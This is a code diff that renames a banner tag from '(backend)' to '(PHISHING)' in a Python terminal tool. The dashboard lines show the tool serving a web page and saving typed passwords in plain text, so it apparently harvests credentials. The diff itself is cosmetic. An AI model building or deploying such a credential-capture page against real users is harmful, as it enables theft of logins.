@@ -354,7 +354,7 @@ def _logo_lines():
 
 
 def print_banner():
-    """Logo, version, the '(backend)' tag and the developer credit, all
+    """Logo, version, the '(PHISHING)' tag and the developer credit, all
     inside one clean unicode-bordered frame (orange accent) - a proper
     frame around the brand, not bare floating text. Drawn with the same
     straight-line style as the live dashboard; every other box in the
@@ -381,7 +381,7 @@ def print_banner():
         lines.append(row(APP_NAME, color=C.ORANGE, bold=True))
     lines.append(blank())
     lines.append(row(f"{APP_NAME}  {APP_VERSION}"))
-    lines.append(row("(backend)", color=C.ORANGE, bold=True))
+    lines.append(row("(PHISHING)", color=C.ORANGE, bold=True))
     lines.append(row(f"developed by {APP_AUTHOR}", color=C.GREY))
     lines.append(blank())
     lines.append(f"{C.ORANGE}└{'─' * (w - 2)}┘{C.RESET}")
@@ -392,7 +392,7 @@ def print_banner():
 
 def print_farewell():
     """Printed on the REAL terminal, right below the command the user ran,
-    after the full-screen app has closed: logo + (backend) tag + developer
+    after the full-screen app has closed: logo + (PHISHING) tag + developer
     credit, then a closing status box and a goodbye line."""
     print_banner()
     print()
@@ -708,7 +708,7 @@ def main():
         # the step-by-step history above disappears here - only the live
         # dashboard (this function's own output) stays on screen from now
         set_dashboard_header([
-            f"{APP_NAME} {APP_VERSION}  (backend)",
+            f"{APP_NAME} {APP_VERSION}  (PHISHING)",
             f"Passwords       : {'clean text (as typed)' if not args.hash_passwords else 'hashed'}",
             f"Open in browser : http://{'127.0.0.1' if args.host == '0.0.0.0' else args.host}:{server.server_address[1]}/",
             f"Data saved to   : {db_path}",
